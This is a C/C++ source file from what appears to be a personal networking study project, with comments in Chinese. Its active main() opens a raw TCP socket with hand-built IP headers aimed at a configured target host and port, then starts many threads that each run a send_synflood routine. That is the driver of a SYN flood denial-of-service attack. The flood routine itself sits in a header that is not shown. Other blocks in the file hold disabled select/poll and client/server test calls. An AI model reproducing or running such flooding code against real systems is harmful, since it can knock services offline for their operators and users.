//
// Created by 姚文锋 on 2018/8/7.
//
#if 1
//#include "unix/select_poll/sp_utility.h"
#include "unix/define.h"
using namespace std;

int main() {

#if 0
    selectPollServer();
#endif
#if 0
    selectPollClient();
#endif
#if 1
    struct sockaddr_in address;
    struct hostent * host = NULL;

    int on = 1;
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;

    alive = 1;
    /* 截取信号CTRL+C */
//    signal(SIGINT, sig_int);

    bzero(&address, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons(TARGET_PORT);
    address.sin_addr.s_addr = inet_addr(TARGET_HOST);
    printf("host ip=%s\n", inet_ntoa(address.sin_addr));

    /* 建立原始socket */
    int sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock_fd < 0)
    {
        perror("socket()");
        exit(1);
    }
    /* 设置IP选项 */
    if (setsockopt (sock_fd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0)
    {
        perror("setsockopt()");
        exit(1);
    }
    /* 将程序的权限修改为普通用户 */
    setuid(getpid());
//    send_synflood(&address, sock_fd);
/* 建立多个线程协同工作 */
    typedef void* (*THREADFUN)(void*);
    struct newSocketFd newSocketFdObj;
    newSocketFdObj.addr = address;
    newSocketFdObj.sock_fd = sock_fd;
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, (THREADFUN)send_synflood, &newSocketFdObj);
        if(err != 0)
        {
            perror("pthread_create()");
            exit(1);
        }
    }

    /* 等待线程结束 */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_join(pthread[i], NULL);
        if(err != 0)
        {
            perror("pthread_join Error\n");
            exit(1);
        }
    }
    close(sock_fd);
#endif

}

#endif





#if 0
#include "window/utility.h"

int main() {
#if 0
    serverTest();
#endif
#if 1
    clientTest();
#endif
}
#endif
